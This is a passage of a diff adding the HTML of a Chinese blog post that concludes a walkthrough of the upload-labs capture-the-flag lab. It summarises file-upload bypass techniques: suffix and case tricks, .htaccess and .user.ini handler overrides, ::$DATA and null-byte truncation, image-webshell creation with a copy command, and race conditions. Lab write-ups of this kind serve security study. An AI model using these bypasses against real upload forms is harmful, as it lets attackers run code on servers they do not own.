+<span style="color:#2aa198">4.</span><span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> reset(<span style="color:#268bd2">$file</span>) <span style="color:#719e07">.</span> <span style="color:#2aa198">&#39;.&#39;</span> <span style="color:#719e07">.</span> <span style="color:#268bd2">$file</span>[count(<span style="color:#268bd2">$file</span>) <span style="color:#719e07">-</span> <span style="color:#2aa198">1</span>];给文件重新取名,数组第一个值<span style="color:#719e07">+</span>数组<span style="color:#719e07">-</span><span style="color:#2aa198">1</span>的值,这里就可以构造一个(<span style="color:#2aa198">&#39;1.php&#39;</span>,<span style="color:#2aa198">&#39;&#39;</span>,<span style="color:#2aa198">&#39;jpg&#39;</span>)的数组,这样file_name就会得到为1<span style="color:#719e07">.</span>php的值
+</code></pre></div><p>下面构造payload</p>
+<p>默认情况下save_name不是数组,所以要在包中把它修改为数组</p>
+<p><img src="images/upload-labs-challenge/21-1.png" alt="21-1"></p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">save_name[<span style="color:#2aa198">0</span>] <span style="color:#719e07">=</span> php文件名
+save_name[<span style="color:#2aa198">1</span>] <span style="color:#719e07">=</span> 空
+sava_name[<span style="color:#2aa198">2</span>] <span style="color:#719e07">=</span> jpg,gif,png中其中一个
+</code></pre></div><p><img src="images/upload-labs-challenge/22-2.png" alt="22-2"></p>
+<p><img src="images/upload-labs-challenge/22-3.png" alt="22-3"></p>
+<h3 id="总结">总结</h3>
+<h4 id="客户端">客户端</h4>
+<h5 id="js检查pass-01">js检查[pass-01]</h5>
+<ol>
+<li>先上传一个可以上传的文件,burp抓包在更改后缀名</li>
+<li>在浏览器中F12直接添加或删除对应的代码</li>
+</ol>
+<h4 id="服务端">服务端</h4>
+<h5 id="检查后缀">检查后缀</h5>
+<h6 id="黑名单">黑名单</h6>
+<ol>
+<li>
+<p>特殊后缀绕过[pass-03]</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">
+</code></pre></div></li>
+</ol>
+<p>例如:phtml;php5;php3;phps;pht</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
+2. .htaccess上传[pass-04]
+
+上传**.htaccess**文件是其他文件类型也解析为php
+
+```php
+SetHandler application/x-httpd-php
+</code></pre></div><ol start="3">
+<li>
+<p>.user.ini上传[pass-5]</p>
+<p>利用条件:fastcgi运行的php,上传目录下存在正常的php文件</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#586e75">#.user.ini文件内容:
+</span><span style="color:#586e75"></span>auto_prepend_file<span style="color:#719e07">=</span><span style="color:#2aa198">1.</span>jpg
+
+<span style="color:#586e75">#1.jpg文件内容:
+</span><span style="color:#586e75"></span><span style="color:#719e07">&lt;?</span>php phpinfo(); <span style="color:#719e07">?&gt;</span>
+</code></pre></div><p>上传以上两个文件后,去访问该目录下的任意php文件即可</p>
+</li>
+<li>
+<p>大小写绕过[pass-06]</p>
+<p>通过后缀名更改大小写来实现bypass</p>
+</li>
+<li>
+<p>空格绕过[pass-07]</p>
+<p>当文件上传没有限制空格时,可在后缀名后加上空格,如:&ldquo;1.php&quot;变成&quot;1.php &quot;</p>
+</li>
+<li>
+<p>点绕过[pass-08]</p>
+<p>当文件上传没有限制点时,可在后缀名后加上点,如:&ldquo;1.php&quot;变成&quot;1.php.&rdquo;</p>
+</li>
+<li>
+<p>::$DATA绕过[pass-09]</p>
+<p>在Windows下可利用此特性来bypass</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#2aa198">1.</span>php<span style="color:#719e07">:</span><span style="color:#268bd2">$DATA</span>
+</code></pre></div></li>
+<li>
+<p>点加空格绕过[pass-10]</p>
+<p>在某种文件不重命名,且检测规则只检测的一次的情况下</p>
+<p>可以使用**1.php. .**bypass</p>
+</li>
+<li>
+<p>双写绕过[pass-11]</p>
+<p>黑名单限制,出现黑名单内容,自动删除</p>
+<p>利用双写来bypass,例:<strong>1.pphphp</strong></p>
+</li>
+</ol>
+<h6 id="白名单">白名单</h6>
+<ol>
+<li>
+<p>文件头检查(服务端MIME检测)[pass-02]</p>
+<p>修改Content-Type类型</p>
+</li>
+<li>
+<p>%00截断</p>
+<p>条件</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#2aa198">1.</span>php版本<span style="color:#719e07">&lt;</span><span style="color:#2aa198">5.3</span><span style="color:#719e07">.</span><span style="color:#2aa198">4</span>
+<span style="color:#2aa198">2.</span>php开启magic_quotes_gpc,即Off 
+</code></pre></div><p>get情况下使用,目录可控,在目录后面添加1.php%00,就可以把正常的jpg文件给截断</p>
+</li>
+<li>
+<p>0x00截断</p>
+<p>条件</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PHP" data-lang="PHP"><span style="color:#2aa198">1.</span>php版本<span style="color:#719e07">&lt;</span><span style="color:#2aa198">5.3</span><span style="color:#719e07">.</span><span style="color:#2aa198">4</span>
+<span style="color:#2aa198">2.</span>php开启magic_quotes_gpc,即Off 
+</code></pre></div><p>post情况下使用,因为post不会像get那样url解码</p>
+<p>也是目录可控,但是这里是需要在hex修改为00</p>
+</li>
+</ol>
+<h5 id="检测内容">检测内容</h5>
+<ol>
+<li>
+<p>文件头检查[pass-14]</p>
+<p>利用命令来合成图片马,直接上传</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">copy 1.jpg/b + 1.php/a jpg.jpg 
+</code></pre></div><p>然后在通过包含来回显就可以bypass</p>
+</li>
+<li>
+<p>getimagesize()检测[pass-15]</p>
+<p>同上,但是前提是这张图片马的图片内容还能显示</p>
+</li>
+<li>
+<p>exif_imagetype检测[pass-16]</p>
+<p>依旧同上,图片马舒舒服服</p>
+</li>
+<li>
+<p>二次渲染[pass-17]</p>
+<p>gif图片先上传图片马,在把渲染过的图片和图片马对比查找没有更改的地方在相应的地方添加php代码即可</p>
+<p>jpg需要使用个脚本,然后直接上传即可</p>
+<p><a href="https://github.com/BlackFan/jpg_payload">https://github.com/BlackFan/jpg_payload</a></p>
+<p>png也是使用脚本直接操作就完事了</p>
+</li>
+</ol>
+<h5 id="代码逻辑">代码逻辑</h5>
+<ol>
+<li>
+<p>条件竞争[pass-18-19]</p>
+<p>利用&quot;快&quot;来于代码赛跑</p>
+<p>同时执行多个并发线程来达到bypass</p>
+</li>
+</ol>
+
+		</div>
+
+		<div class="post-tags">
+			
+				
+					<nav class="nav tags">
+							<ul class="flat">
+								
+								<li><a href="/tags/web%E5%AE%89%E5%85%A8">web安全</a></li>
+								
+								<li><a href="/tags/note">note</a></li>
+								
+							</ul>
+					</nav>
+				
+			
+		</div>
+		</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div> © Copyright notice |  <a href="https://github.com/godbless7">lprvep</a></div>
+	</nav>
+</div>
+
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-123-45', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+<script>feather.replace()</script>
+</body>
+</html>
